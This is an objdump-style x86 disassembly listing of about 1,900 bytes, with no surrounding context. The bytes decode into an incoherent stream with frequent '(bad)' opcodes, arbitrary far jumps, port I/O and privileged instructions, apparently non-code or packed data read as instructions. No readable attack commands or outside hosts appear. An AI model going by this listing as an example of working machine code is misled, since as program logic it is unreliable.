  41e08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e08c:	ror    DWORD PTR [edx-0x2],0x3a
  41e090:	or     bl,BYTE PTR [ebx+0x40bf1ae5]
  41e096:	xor    eax,0xf8a5a52f
  41e09b:	jle    0x41e099
  41e09d:	xor    BYTE PTR ds:0xfd1c0330,cl
  41e0a3:	dec    esp
  41e0a4:	xchg   esp,eax
  41e0a5:	rcr    edi,0xb3
  41e0a8:	pop    edi
  41e0a9:	adc    al,0xcc
  41e0ab:	jmp    0xb442:0xae94a0e1
  41e0b2:	and    al,0x5e
  41e0b4:	sub    BYTE PTR [ebp-0x76b6cce6],al
  41e0ba:	xchg   edx,eax
  41e0bb:	loope  0x41e0fd
  41e0bd:	addr16 and al,0x60
  41e0c0:	aaa    
  41e0c1:	test   BYTE PTR [ebp-0x63],al
  41e0c4:	xor    eax,0x75c8aafb
  41e0c9:	inc    esi
  41e0ca:	xchg   esp,eax
  41e0cb:	sbb    al,0xc1
  41e0cd:	loope  0x41e113
  41e0cf:	ins    DWORD PTR es:[edi],dx
  41e0d0:	ss int3 
  41e0d2:	push   esp
  41e0d3:	nop
  41e0d4:	aad    0x3f
  41e0d6:	aam    0xa5
  41e0d8:	or     eax,0x552fe46a
  41e0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0de:	mov    eax,0x404add52
  41e0e3:	inc    esi
  41e0e4:	and    edi,DWORD PTR [ebx-0x3e]
  41e0e7:	adc    esp,ecx
  41e0e9:	push   0xffffff90
  41e0eb:	fsub   QWORD PTR [ebx+0x30534917]
  41e0f1:	dec    eax
  41e0f2:	int    0xa8
  41e0f4:	test   al,0x32
  41e0f6:	pop    ebx
  41e0f7:	add    eax,edx
  41e0f9:	scas   eax,DWORD PTR es:[edi]
  41e0fa:	xor    BYTE PTR [ecx],dh
  41e0fc:	add    DWORD PTR [eax],esp
  41e0fe:	push   ecx
  41e0ff:	jmp    0x59ee:0x772ab345
  41e106:	pop    esi
  41e107:	adc    dl,BYTE PTR ds:[ebx+0x1c5b27f1]
  41e10e:	push   ds
  41e10f:	xlat   BYTE PTR ds:[ebx]
  41e110:	fdivr  QWORD PTR [edx+0x7e12e339]
  41e117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e118:	mov    ebx,DWORD PTR [ecx]
  41e11a:	es inc ebx
  41e11c:	jne    0x41e13c
  41e11e:	test   edi,0xa37b9d88
  41e124:	pop    ecx
  41e125:	jmp    0xb7e1:0x14a91f2c
  41e12c:	dec    edi
  41e12d:	jg     0x41e0de
  41e12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e130:	retf   0xe989
  41e133:	jle    0x41e192
  41e135:	and    eax,0xa2becdb4
  41e13a:	push   eax
  41e13b:	xchg   esp,eax
  41e13c:	cwde   
  41e13d:	sub    edx,DWORD PTR [eax+0x3bef7ce8]
  41e143:	ret    0xaf73
  41e146:	repnz test DWORD PTR [eax+0x53],0x345a28e4
  41e14e:	fsubrp st(6),st
  41e150:	arpl   WORD PTR [ebp+eiz*4+0x14],sp
  41e154:	call   FWORD PTR [ebx-0x339cb3e7]
  41e15a:	cmp    al,0x71
  41e15c:	loope  0x41e110
  41e15e:	int3   
  41e15f:	push   ds
  41e160:	sti    
  41e161:	ret    0x9bf9
  41e164:	cmc    
  41e165:	or     BYTE PTR [edx-0x15],dl
  41e168:	mov    WORD PTR [edx],gs
  41e16a:	inc    edi
  41e16b:	repnz (bad) 
  41e16d:	xlat   BYTE PTR ds:[ebx]
  41e16e:	out    0x4b,eax
  41e170:	mov    ebx,0x4d884ba2
  41e175:	xlat   BYTE PTR ds:[ebx]
  41e176:	or     eax,0x2f68f92f
  41e17b:	das    
  41e17c:	mov    edx,esp
  41e17e:	lods   al,BYTE PTR ds:[esi]
  41e17f:	push   es
  41e180:	xchg   ecx,eax
  41e181:	mov    bh,0x73
  41e183:	cmc    
  41e184:	and    ecx,DWORD PTR [edx+0xdf9c76e]
  41e18a:	fidiv  DWORD PTR [esi]
  41e18c:	dec    esp
  41e18d:	adc    BYTE PTR [ebx-0x12],dh
  41e190:	fisubr DWORD PTR [ecx-0xa45ff84]
  41e196:	or     bh,BYTE PTR [ebp+0x6]
  41e199:	xchg   esp,eax
  41e19a:	mov    bh,0x43
  41e19c:	fcmovu st,st(7)
  41e19e:	in     eax,dx
  41e19f:	call   0xa45c:0x5f889bd2
  41e1a6:	stos   DWORD PTR es:[edi],eax
  41e1a7:	loop   0x41e19f
  41e1a9:	arpl   WORD PTR [ecx+0x3ec5c515],ax
  41e1af:	cmc    
  41e1b0:	pop    ds
  41e1b1:	pop    edi
  41e1b2:	(bad)  
  41e1b3:	sbb    bh,BYTE PTR [esi+eiz*1-0x61f7ec4a]
  41e1ba:	scas   eax,DWORD PTR es:[edi]
  41e1bb:	inc    ebp
  41e1bc:	ret    0x181f
  41e1bf:	jo     0x41e145
  41e1c1:	or     ch,BYTE PTR [edi+0x75e4eec2]
  41e1c7:	pusha  
  41e1c8:	dec    eax
  41e1c9:	int    0x28
  41e1cb:	sbb    DWORD PTR [edi],edx
  41e1cd:	clc    
  41e1ce:	push   0xffffffcc
  41e1d0:	or     ecx,DWORD PTR [ecx+0x3846e63e]
  41e1d6:	jae    0x41e16e
  41e1d8:	test   BYTE PTR [ecx],dl
  41e1da:	mov    dh,0xd1
  41e1dc:	inc    ecx
  41e1dd:	test   BYTE PTR [edi+0x3a],dh
  41e1e0:	add    DWORD PTR [ecx-0x36],ebp
  41e1e3:	or     DWORD PTR [ebx+0x1eac30f9],esi
  41e1e9:	jnp    0x41e216
  41e1eb:	or     eax,0x7f1bd4bd
  41e1f0:	loopne 0x41e230
  41e1f2:	into   
  41e1f3:	mov    BYTE PTR [edi-0x3b],dl
  41e1f6:	(bad)  
  41e1f7:	(bad)  [ebp+0x15767181]
  41e1fd:	mov    BYTE PTR [esp+ebp*4],ah
  41e200:	hlt    
  41e201:	push   es
  41e202:	xchg   ecx,eax
  41e203:	aad    0xe7
  41e205:	mov    bl,0x4c
  41e207:	inc    esp
  41e208:	inc    ebp
  41e209:	ss stos DWORD PTR es:[edi],eax
  41e20b:	pop    ss
  41e20c:	out    dx,eax
  41e20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e20e:	inc    edx
  41e20f:	add    edx,DWORD PTR [eax]
  41e211:	jge    0x41e193
  41e213:	pop    ds
  41e214:	xor    eax,0xd5f22f4a
  41e219:	mov    eax,0x68af1c86
  41e21e:	adc    ebp,esp
  41e220:	mov    al,ds:0x32116fd
  41e225:	or     edx,esp
  41e227:	shl    DWORD PTR [ecx+eiz*8-0x27],1
  41e22b:	push   esp
  41e22c:	hlt    
  41e22d:	scas   eax,DWORD PTR es:[edi]
  41e22e:	dec    edi
  41e22f:	jg     0x41e1e4
  41e231:	adc    dh,BYTE PTR ds:0x4ffc25b1
  41e237:	lods   eax,DWORD PTR ds:[esi]
  41e238:	imul   eax,ecx,0xc6cd0166
  41e23e:	cmp    al,0x59
  41e240:	dec    edx
  41e241:	jno    0x41e1d6
  41e243:	mov    edi,0x708b5053
  41e248:	cs or  al,0xab
  41e24b:	test   al,0x22
  41e24d:	or     edx,DWORD PTR [edi-0x41]
  41e250:	fstp   DWORD PTR [eax+0x2bc96907]
  41e256:	mov    esi,DWORD PTR ds:0xf564aee6
  41e25c:	or     DWORD PTR [esi+edi*1+0x685c3ab6],ebx
  41e263:	aas    
  41e264:	or     al,0xaf
  41e266:	jle    0x41e275
  41e268:	stos   BYTE PTR es:[edi],al
  41e269:	dec    edi
  41e26a:	or     esi,DWORD PTR gs:[ebp-0x62]
  41e26e:	mov    eax,0xca443d55
  41e273:	pop    ebx
  41e274:	(bad)  
  41e275:	jne    0x41e226
  41e277:	popa   
  41e278:	lock mov edi,DWORD PTR [ebx-0x7c]
  41e27c:	fwait
  41e27d:	push   ds
  41e27e:	sbb    eax,0xbb3b596e
  41e283:	(bad)  
  41e284:	mov    esi,0xe787d5b1
  41e289:	inc    edx
  41e28a:	jle    0x41e2ee
  41e28c:	in     al,dx
  41e28d:	fld    QWORD PTR [ebp-0x38]
  41e290:	test   al,0xf4
  41e292:	(bad)  
  41e293:	call   0x3c1ecf95
  41e298:	stos   DWORD PTR es:[edi],eax
  41e299:	add    esi,edi
  41e29b:	retf   0x6a1c
  41e29e:	add    bl,bh
  41e2a0:	in     al,dx
  41e2a1:	and    DWORD PTR [eax+0x69],esi
  41e2a4:	data16 clc 
  41e2a6:	test   BYTE PTR [ebx+0x14b63ce6],dh
  41e2ac:	cwde   
  41e2ad:	clc    
  41e2ae:	ins    DWORD PTR es:[edi],dx
  41e2af:	shl    DWORD PTR ds:0x372916fb,0x30
  41e2b6:	jne    0x41e30b
  41e2b8:	dec    esp
  41e2b9:	mov    esi,ss
  41e2bb:	push   ss
  41e2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2bd:	inc    esi
  41e2be:	xor    al,0xad
  41e2c0:	iret   
  41e2c1:	or     edi,eax
  41e2c3:	add    eax,0xcc2f0121
  41e2c8:	repnz xor DWORD PTR [edx],ecx
  41e2cb:	add    ah,dh
  41e2cd:	xor    DWORD PTR [edi+0x2d],ebx
  41e2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2d1:	ja     0x41e2c9
  41e2d3:	xchg   esi,eax
  41e2d4:	lds    eax,FWORD PTR [edi+0x42]
  41e2d7:	mov    ds:0x84ce6166,eax
  41e2dc:	(bad)  
  41e2dd:	fist   WORD PTR [ebx-0x36f626ca]
  41e2e3:	sub    DWORD PTR [eax+eax*2-0x2f],eax
  41e2e7:	adc    DWORD PTR [edx+0x1844e851],edi
  41e2ed:	jecxz  0x41e306
  41e2ef:	cmp    al,0x92
  41e2f1:	neg    DWORD PTR [ecx+ecx*2-0xb]
  41e2f5:	jp     0x41e349
  41e2f7:	mov    dl,dl
  41e2f9:	add    DWORD PTR [edx+0x45],esi
  41e2fc:	jne    0x41e368
  41e2fe:	jae    0x41e305
  41e300:	mov    eax,0xf255393c
  41e305:	pop    ebp
  41e306:	add    BYTE PTR [esi-0x1],cl
  41e309:	add    al,al
  41e30b:	pop    edi
  41e30c:	into   
  41e30d:	je     0x41e302
  41e30f:	xchg   esp,eax
  41e310:	mov    edx,0x10c757a3
  41e315:	mov    BYTE PTR [ebx],al
  41e317:	cli    
  41e318:	xchg   bl,bl
  41e31a:	adc    dl,BYTE PTR [edx+0x51]
  41e31d:	mov    ds:0x5d8508b0,al
  41e322:	jb     0x41e32b
  41e324:	mov    eax,0xe92de042
  41e329:	fild   QWORD PTR [esi-0x184ab230]
  41e32f:	pop    ds
  41e330:	push   es
  41e331:	hlt    
  41e332:	adc    ecx,eax
  41e334:	(bad)  
  41e335:	lods   al,BYTE PTR ds:[esi]
  41e336:	les    ebp,FWORD PTR [ebp+0x313987f9]
  41e33c:	jmp    0xa06c:0xa21e11ea
  41e343:	lds    esi,FWORD PTR [edi+0x3c]
  41e346:	sub    BYTE PTR [edx+0x1c0b06a5],ch
  41e34c:	pop    edi
  41e34d:	xor    eax,DWORD PTR [ebx+0x1d54a630]
  41e353:	sub    bl,BYTE PTR [ebp-0x47d01e23]
  41e359:	out    dx,eax
  41e35a:	jns    0x41e363
  41e35c:	ja     0x41e3bb
  41e35e:	jg     0x41e319
  41e360:	jg     0x41e368
  41e362:	fsubr  DWORD PTR ds:0xd2f2879e
  41e368:	cmp    eax,0x34e19d23
  41e36d:	mov    ebp,0xbc947049
  41e372:	or     DWORD PTR [ebp+0x77],0x96aa5c52
  41e379:	inc    edx
  41e37a:	jle    0x41e3e0
  41e37c:	pop    es
  41e37d:	aaa    
  41e37e:	mov    ecx,0xa01af50e
  41e383:	loopne 0x41e3f1
  41e385:	mov    bh,0x4
  41e387:	stc    
  41e388:	push   cs
  41e389:	xchg   ah,al
  41e38b:	xchg   esp,eax
  41e38c:	push   ds
  41e38d:	adc    ch,BYTE PTR [ecx+0x7d8b43e7]
  41e393:	cld    
  41e394:	cmp    bl,BYTE PTR [ebp+0x2f]
  41e397:	adc    esp,edx
  41e399:	push   0x7c3af575
  41e39e:	push   ss
  41e39f:	ja     0x41e3da
  41e3a1:	cld    
  41e3a2:	mov    eax,ds:0x90e899a8
  41e3a7:	xor    eax,DWORD PTR [eax-0x33]
  41e3aa:	ja     0x41e37b
  41e3ac:	pop    esi
  41e3ad:	or     al,0xda
  41e3af:	out    0x4d,eax
  41e3b1:	sbb    BYTE PTR [eax+0x55],dl
  41e3b4:	adc    edx,edi
  41e3b6:	mov    dl,0x21
  41e3b8:	jns    0x41e38a
  41e3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3bb:	sti    
  41e3bc:	xlat   BYTE PTR ds:[ebx]
  41e3bd:	das    
  41e3be:	add    DWORD PTR [ebx-0x77],edi
  41e3c1:	in     eax,0x50
  41e3c3:	push   es
  41e3c4:	rol    esi,0xdb
  41e3c7:	es mov esi,0x6ed2d728
  41e3cd:	das    
  41e3ce:	mov    eax,ds:0xeb95ff6b
  41e3d3:	lods   al,BYTE PTR ds:[esi]
  41e3d4:	and    BYTE PTR [edx],dh
  41e3d6:	sbb    DWORD PTR [edi-0x2ab43242],0xfbc8048f
  41e3e0:	add    eax,0x4211ba79
  41e3e5:	bound  ebp,QWORD PTR ds:0xb6ba8a67
  41e3eb:	jae    0x41e377
  41e3ed:	sbb    ecx,eax
  41e3ef:	loope  0x41e3f5
  41e3f1:	xchg   dh,bh
  41e3f3:	int    0xc3
  41e3f5:	inc    ebx
  41e3f6:	(bad)  
  41e3f8:	test   eax,0x377817ad
  41e3fd:	push   edx
  41e3fe:	imul   ebx,DWORD PTR [ebp-0x334a7d3a],0xffffffa8
  41e405:	adc    esp,DWORD PTR [esi+ebp*2]
  41e408:	mov    bl,0xd6
  41e40a:	pop    ebp
  41e40b:	(bad)  
  41e40c:	loopne 0x41e3cc
  41e40e:	pushf  
  41e40f:	fwait
  41e410:	addr16 dec edi
  41e412:	xor    esi,DWORD PTR ds:0xf7081ac8
  41e418:	(bad)  
  41e41a:	mov    bh,0x28
  41e41c:	jns    0x41e41f
  41e41e:	mov    ds:0xbcfc6f54,eax
  41e423:	in     eax,dx
  41e424:	aam    0x43
  41e426:	jecxz  0x41e47b
  41e428:	aad    0xc2
  41e42a:	icebp  
  41e42b:	mov    eax,ebp
  41e42d:	sbb    BYTE PTR [ecx-0x1e009dc4],ah
  41e433:	loop   0x41e414
  41e435:	fldenv [ebp-0x107349bd]
  41e43b:	sbb    dl,BYTE PTR [ebx-0x46]
  41e43e:	sub    al,0x58
  41e440:	xor    edx,DWORD PTR [ecx]
  41e442:	lods   al,BYTE PTR ds:[esi]
  41e443:	add    eax,0x886d68f
  41e448:	jmp    0x41e3d1
  41e44a:	and    al,0x6b
  41e44c:	inc    ebp
  41e44d:	int3   
  41e44e:	nop
  41e44f:	jno    0x41e49c
  41e451:	add    BYTE PTR ds:0x187d7215,ch
  41e457:	fisttp WORD PTR [edi]
  41e459:	cmp    al,0xa3
  41e45b:	in     al,dx
  41e45c:	xor    al,0xf1
  41e45e:	lock mov ecx,0xf299b2c5
  41e464:	mov    cs,WORD PTR [ebp-0x4f]
  41e467:	or     eax,0xf4fb356
  41e46c:	and    eax,0x61c03ab6
  41e471:	and    DWORD PTR [ebp-0x52],0x79e04988
  41e478:	pop    esi
  41e479:	pop    ebp
  41e47a:	sub    al,0xcb
  41e47c:	(bad)
  41e47f:	call   DWORD PTR [eax-0x67]
  41e482:	lds    ebx,FWORD PTR [esi+0x21]
  41e485:	pop    ebx
  41e486:	adc    DWORD PTR [edx-0x46bfdbd9],ebp
  41e48c:	inc    esp
  41e48d:	into   
  41e48e:	test   eax,0xa062017e
  41e493:	clc    
  41e494:	cmp    ch,BYTE PTR [eax+0xe]
  41e497:	in     eax,dx
  41e498:	cli    
  41e499:	mov    DWORD PTR [ecx],ebx
  41e49b:	dec    ebp
  41e49c:	outs   dx,BYTE PTR ds:[esi]
  41e49d:	dec    edi
  41e49e:	imul   ebp,ebp,0x4f
  41e4a1:	mov    ah,0x65
  41e4a4:	jecxz  0x41e46c
  41e4a6:	inc    esp
  41e4a7:	imul   ecx,DWORD PTR [edx],0x6
  41e4aa:	inc    eax
  41e4ab:	neg    BYTE PTR [ebx+0x3d]
  41e4ae:	inc    ebp
  41e4af:	add    ebp,0x4499c332
  41e4b5:	test   bh,bl
  41e4b7:	loopne 0x41e4b2
  41e4b9:	sahf   
  41e4ba:	cld    
  41e4bb:	jno    0x41e4a9
  41e4bd:	cmp    al,0x7f
  41e4bf:	mov    ds:0xa90ade40,al
  41e4c4:	ror    BYTE PTR ds:0x15c07ad,1
  41e4ca:	frstor [ebp-0x78]
  41e4cd:	or     cl,bl
  41e4cf:	(bad)  
  41e4d0:	cld    
  41e4d1:	jb     0x41e45d
  41e4d3:	and    eax,0xef3c885a
  41e4d8:	loop   0x41e4f3
  41e4da:	out    0xf,eax
  41e4dc:	mov    eax,0x62396fdd
  41e4e1:	fiadd  DWORD PTR [eax+0x58]
  41e4e4:	cld    
  41e4e5:	call   0x343b641f
  41e4ea:	int3   
  41e4eb:	ficomp DWORD PTR [eax+0x6ac94354]
  41e4f1:	cdq    
  41e4f2:	pop    edi
  41e4f3:	pop    edx
  41e4f4:	push   eax
  41e4f5:	in     eax,0x2e
  41e4f7:	shl    BYTE PTR [ecx-0x4],1
  41e4fa:	fimul  DWORD PTR [edx]
  41e4fc:	sub    esp,edx
  41e4fe:	push   ss
  41e4ff:	dec    ebp
  41e500:	cmp    bl,BYTE PTR [ecx+eax*2+0x6c]
  41e504:	test   eax,0x93bfb731
  41e509:	enter  0x92a,0xe4
  41e50d:	sbb    ebx,DWORD PTR [ebp-0x5b]
  41e510:	mov    ch,0x7c
  41e512:	adc    eax,DWORD PTR [ebp-0x7d]
  41e515:	or     eax,0xab1c14bc
  41e51a:	js     0x41e4d0
  41e51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e51d:	dec    esp
  41e51e:	mov    bh,0xe5
  41e520:	das    
  41e521:	lds    edi,FWORD PTR [ebx]
  41e523:	adc    al,0xd
  41e525:	mov    esi,0x36374fe4
  41e52a:	fdivrp st(1),st
  41e52c:	lahf   
  41e52d:	loopne 0x41e589
  41e52f:	pop    ebx
  41e530:	out    dx,eax
  41e531:	add    DWORD PTR [esi-0x3f61bb48],0x19
  41e538:	mov    al,0x8
  41e53a:	ins    DWORD PTR es:[edi],dx
  41e53b:	ins    BYTE PTR es:[edi],dx
  41e53c:	nop
  41e53d:	jb     0x41e56b
  41e53f:	icebp  
  41e540:	dec    esi
  41e541:	test   BYTE PTR [edx],ch
  41e543:	mov    bl,0x33
  41e545:	inc    esi
  41e546:	outs   dx,DWORD PTR ds:[esi]
  41e547:	and    ebp,DWORD PTR es:[edi-0xb5a3b1f]
  41e54e:	(bad)  
  41e54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e550:	rcr    DWORD PTR [ebx-0x5e],0x99
  41e554:	mov    ds,ebp
  41e556:	outs   dx,BYTE PTR ds:[esi]
  41e557:	in     al,0xd2
  41e559:	(bad)  
  41e55a:	shl    dh,0x8c
  41e55d:	icebp  
  41e55e:	outs   dx,DWORD PTR ds:[esi]
  41e55f:	mov    ebx,DWORD PTR [ecx-0x63c2891a]
  41e565:	rcl    BYTE PTR [ecx+0x75939a32],cl
  41e56b:	or     bh,BYTE PTR [ecx+0x74]
  41e56e:	pop    ss
  41e56f:	mov    al,ds:0x79e0c431
  41e574:	mov    edx,0x95d16171
  41e579:	loop   0x41e505
  41e57b:	mov    esi,0x750a899f
  41e580:	(bad)  
  41e581:	fcom   QWORD PTR [esi+0x5f]
  41e584:	pushf  
  41e585:	or     al,BYTE PTR [edx]
  41e587:	mov    bh,0x8d
  41e589:	xchg   ecx,eax
  41e58a:	scas   eax,DWORD PTR es:[edi]
  41e58b:	push   edx
  41e58c:	push   ss
  41e58d:	mov    edx,0xe4f3259b
  41e592:	dec    ebx
  41e593:	inc    edi
  41e594:	ins    BYTE PTR es:[edi],dx
  41e595:	add    esp,ebp
  41e597:	and    BYTE PTR [eax],cl
  41e599:	push   edi
  41e59a:	(bad)  
  41e59b:	call   0x4ac46b39
  41e5a0:	(bad)  
  41e5a1:	cld    
  41e5a2:	loopne 0x41e60a
  41e5a4:	rcr    DWORD PTR [ebx],cl
  41e5a6:	fsubr  st,st(6)
  41e5a8:	sub    BYTE PTR [ecx],bh
  41e5aa:	pushf  
  41e5ab:	xchg   esi,eax
  41e5ac:	cli    
  41e5ad:	in     al,0x44
  41e5af:	add    bl,BYTE PTR [edi+0x36257f1a]
  41e5b5:	sbb    al,0xc4
  41e5b7:	dec    ecx
  41e5b8:	lock out 0xad,eax
  41e5bb:	cwde   
  41e5bc:	sub    bl,dl
  41e5be:	push   cs
  41e5bf:	call   0xe53ee3e5
  41e5c4:	psrlq  mm2,0xcd
  41e5c8:	push   cs
  41e5c9:	loope  0x41e5a1
  41e5cb:	cmc    
  41e5cc:	fdiv   DWORD PTR [ebp+0x44fa07c0]
  41e5d2:	fild   QWORD PTR [ebp-0x168300dd]
  41e5d8:	or     eax,0x7efad171
  41e5dd:	inc    ebx
  41e5de:	mov    ebx,0xd75e189f
  41e5e3:	push   0x8a8c1030
  41e5e8:	(bad)  [ebx]
  41e5ea:	aad    0x5c
  41e5ec:	inc    edi
  41e5ed:	inc    edi
  41e5ee:	lock scas eax,DWORD PTR es:[edi]
  41e5f0:	mov    ecx,0xb0df9b85
  41e5f5:	jmp    0x1a1c:0x6ff5800d
  41e5fc:	dec    ecx
  41e5fd:	in     al,dx
  41e5fe:	push   eax
  41e5ff:	pop    ss
  41e600:	mov    al,ds:0xfb1dec99
  41e605:	sbb    cl,BYTE PTR [edx]
  41e607:	sbb    eax,0x3700595d
  41e60c:	and    ebp,esp
  41e60e:	add    dl,bh
  41e610:	jle    0x41e643
  41e612:	xchg   ebp,eax
  41e613:	mov    ecx,edx
  41e615:	mov    edx,0x65c46413
  41e61a:	inc    eax
  41e61b:	ror    BYTE PTR [eax+0x16],cl
  41e61e:	sub    DWORD PTR [ebp+ecx*8-0xc],edx
  41e622:	fld    QWORD PTR ds:0x2be4a461
  41e628:	fninit 
  41e62a:	sbb    DWORD PTR ds:0x6978c397,ebp
  41e630:	shr    DWORD PTR ds:0x79f2ceb8,1
  41e636:	xchg   ebp,eax
  41e637:	call   0x52151786
  41e63c:	lock imul edi,DWORD PTR ds:0x2db83a72,0x2214ae47
  41e647:	pop    ebp
  41e648:	cld    
  41e649:	rol    BYTE PTR [ebp-0xd2a7f5],1
  41e64f:	aam    0xd9
  41e651:	push   eax
  41e652:	test   DWORD PTR [ecx+ebp*8+0x55385aa6],ecx
  41e659:	rol    BYTE PTR [ebx+ecx*4+0x69d28aed],cl
  41e660:	or     DWORD PTR [ecx+eax*2-0x4f],ebp
  41e664:	gs push ecx
  41e666:	std    
  41e667:	les    esi,FWORD PTR [bp+si-0x34e3]
  41e66c:	and    al,0xb1
  41e66e:	push   eax
  41e66f:	and    edi,ebx
  41e671:	adc    esp,edx
  41e673:	push   eax
  41e674:	sbb    al,dh
  41e676:	sub    al,0x29
  41e678:	fwait
  41e679:	sbb    al,0xc9
  41e67b:	daa    
  41e67c:	mov    eax,ds:0xd0428d5b
  41e681:	loopne 0x41e66e
  41e683:	jge    0x41e619
  41e685:	sub    ecx,DWORD PTR [edx+0x481c95bf]
  41e68b:	jl     0x41e69e
  41e68d:	inc    edi
  41e68e:	in     al,dx
  41e68f:	imul   edi,DWORD PTR [ebx+edx*8+0x67050fe3],0xffffffca
  41e697:	mov    esi,0x4580c34a
  41e69c:	test   DWORD PTR [ebp+edi*1-0x70],ebx
  41e6a0:	inc    ebx
  41e6a1:	mov    ebp,DWORD PTR [edx+ebp*2+0x6b]
  41e6a5:	mov    ebp,DWORD PTR [ecx+0x29]
  41e6a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6a9:	bound  edi,QWORD PTR [edx+0x173ed6e9]
  41e6af:	cmc    
  41e6b0:	push   edi
  41e6b1:	outs   dx,DWORD PTR ds:[esi]
  41e6b2:	sbb    al,0x98
  41e6b4:	jae    0x41e723
  41e6b6:	and    DWORD PTR [eax],0x66eb46e5
  41e6bc:	out    dx,al
  41e6bd:	sbb    BYTE PTR [edx],al
  41e6bf:	aam    0x5f
  41e6c1:	adc    DWORD PTR [edx],ebx
  41e6c3:	fnstenv [edi+eax*1-0x35]
  41e6c7:	sub    al,0x14
  41e6c9:	data16 stc 
  41e6cb:	mov    DWORD PTR [ebx+esi*1-0x262a4224],ebx
  41e6d2:	aad    0xab
  41e6d4:	push   cs
  41e6d5:	mov    BYTE PTR [ebx],0x43
  41e6d8:	popa   
  41e6d9:	fsubr  DWORD PTR [ebp-0xa]
  41e6dd:	outs   dx,DWORD PTR ds:[esi]
  41e6de:	retf   
  41e6df:	out    0xae,al
  41e6e1:	or     cl,BYTE PTR [esi-0x39]
  41e6e4:	icebp  
  41e6e5:	ret    
  41e6e6:	out    0x26,eax
  41e6e8:	jg     0x41e6ae
  41e6ea:	pusha  
  41e6eb:	addr16 cmp bl,bh
  41e6ee:	pop    ecx
  41e6ef:	jge    0x41e6fa
  41e6f1:	int3   
  41e6f2:	mov    al,0xea
  41e6f5:	(bad)  
  41e6f6:	repnz pop ecx
  41e6f8:	mov    ecx,0xd9a663c
  41e6fd:	(bad)  
  41e6fe:	lahf   
  41e6ff:	outs   dx,DWORD PTR ds:[esi]
  41e700:	addr16 cmp eax,0xde80f1a0
  41e706:	mov    al,ds:0xac5fd2c
  41e70b:	mov    edx,gs
  41e70d:	fsubr  QWORD PTR [ebp+0x22]
  41e710:	ret    
  41e711:	(bad)  
  41e713:	jecxz  0x41e696
  41e715:	xor    ah,al
  41e717:	in     eax,0xaa
  41e719:	sbb    bl,BYTE PTR [eax-0x7c]
  41e71c:	xorps  xmm5,XMMWORD PTR [ecx]
  41e71f:	lea    ebx,[edi-0x17]
  41e722:	push   ecx
  41e723:	add    edx,DWORD PTR [esi+0x13]
  41e726:	pop    ds
  41e727:	pop    es
  41e728:	pop    ebx
  41e729:	shl    DWORD PTR [edx+ebp*8],cl
  41e72c:	adc    bh,BYTE PTR [edi]
  41e72e:	lea    edi,[ebp+0x575d2728]
  41e734:	loopne 0x41e6c8
  41e736:	inc    edx
  41e737:	popa   
  41e738:	or     DWORD PTR [ebx+0x2a],eax
  41e73b:	int    0xe6
  41e73d:	mov    edx,0xb4df198e
  41e742:	push   esp
  41e743:	sub    cl,BYTE PTR [eax]
  41e745:	pop    ds
  41e746:	ins    BYTE PTR es:[edi],dx
  41e747:	mov    ecx,0x1ec92d89
  41e74c:	stos   BYTE PTR es:[edi],al
  41e74d:	xchg   esi,eax
  41e74e:	ret    0x85ab
  41e751:	sysexit 
  41e753:	sbb    eax,0xa6959dea
  41e758:	into   
  41e759:	jo     0x41e773
  41e75b:	les    edi,FWORD PTR [ebx+0x162e5df6]
  41e761:	shl    dl,0x95
  41e764:	loopne 0x41e7cd
  41e766:	jns    0x41e7cc
  41e768:	push   0xd19345fd
  41e76d:	daa    
  41e76e:	pop    ebx
  41e76f:	out    dx,al
  41e770:	adc    DWORD PTR [edi+ebp*1+0x79],esi
  41e774:	pop    esp
  41e775:	idiv   DWORD PTR [ecx-0x6f]
  41e778:	ja     0x41e721
  41e77a:	ss loopne 0x41e78b
  41e77d:	pop    ecx
  41e77e:	cmp    edi,DWORD PTR [edi+0xe]
  41e781:	mov    bl,0x85
  41e783:	fidivr WORD PTR cs:[ecx]
  41e786:	jecxz  0x41e7bd
  41e788:	push   0x48729b21
  41e78d:	mov    dh,0x4f
  41e78f:	jb     0x41e77f
  41e791:	adc    eax,0xe338e4a3
  41e796:	ret    0xc3e7
  41e799:	mov    ds:0xc048bbe0,eax
  41e79e:	jbe    0x41e734
  41e7a0:	popf   
  41e7a1:	(bad)
  41e7a5:	mov    al,0x30
  41e7a7:	fnstcw WORD PTR [edx-0x71950bfe]
  41e7ad:	cmp    ebp,edi
  41e7af:	add    BYTE PTR [eax+0xabd2308],dl
  41e7b5:	out    dx,al
  41e7b6:	add    DWORD PTR [ebx+ebx*4-0x5ad80b74],ebp
  41e7bd:	stc    
  41e7be:	addr16 ja 0x41e76e
  41e7c1:	cld    
  41e7c2:	aad    0x3e
  41e7c4:	cmp    al,0xc5
  41e7c6:	mov    BYTE PTR ds:0x14997f2b,cl
  41e7cc:	xor    al,0x2c
  41e7ce:	push   ebp
  41e7cf:	mov    ebx,0xc8cedfb3
  41e7d4:	and    DWORD PTR [ecx+0x5df69d8c],ecx
  41e7da:	cmp    BYTE PTR [esi+eax*8+0x69263c58],dh
  41e7e1:	xchg   esp,eax
  41e7e2:	jbe    0x41e7f2
  41e7e4:	out    dx,al
  41e7e5:	jp     0x41e76e
  41e7e7:	pop    edi
  41e7e8:	mov    dh,0x9b
  41e7ea:	dec    ebx
  41e7eb:	pop    eax
  41e7ec:	(bad)  
  41e7ed:	hlt    
  41e7ee:	shl    BYTE PTR [esi+0x6],cl
  41e7f1:	(bad)  
  41e7f2:	xor    al,0xc6
  41e7f4:	jae    0x41e79e
  41e7f6:	dec    eax
  41e7f7:	xor    DWORD PTR [ecx+edi*2-0x5b],esi
  41e7fb:	mul    DWORD PTR [ecx+0x33]
  41e7fe:	or     ah,bl
  41e800:	fist   WORD PTR [eax]
  41e802:	retf   
  41e803:	data16 fsub QWORD PTR [esi]
  41e806:	mov    eax,0xc3d284b
  41e80b:	push   ebx
  41e80d:	icebp  
  41e80e:	xchg   edx,eax
